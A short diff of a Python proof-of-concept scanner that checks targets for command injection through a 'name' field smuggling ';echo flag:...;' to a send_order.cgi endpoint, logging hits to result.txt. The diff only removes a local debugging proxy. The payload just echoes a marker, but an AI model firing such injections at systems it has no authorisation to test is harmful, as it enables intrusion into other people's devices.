@@ -46,15 +46,11 @@ def poc(target):
         'Pragma': 'no - cache',
         'Cache - Control': 'no - cache'
     }
-    proxies = {
-        'http':'127.0.0.1:8080',
-        'https':'127.0.0.1:8080'
-    }
     data='''{"opid":"1","name":";echo flag:102162387;","type":"rest"}'''
     url = target+'/send_order.cgi?parameter=operation'
 
     try:
-        res = requests.post(url=url,headers=headers,data=data,timeout=5,proxies=proxies).text
+        res = requests.post(url=url,headers=headers,data=data,timeout=5).text
         if "ok" in res:
             with open('result.txt','a') as fp1:
                 fp1.write(f"[+]{target} is veriable"+'\n')
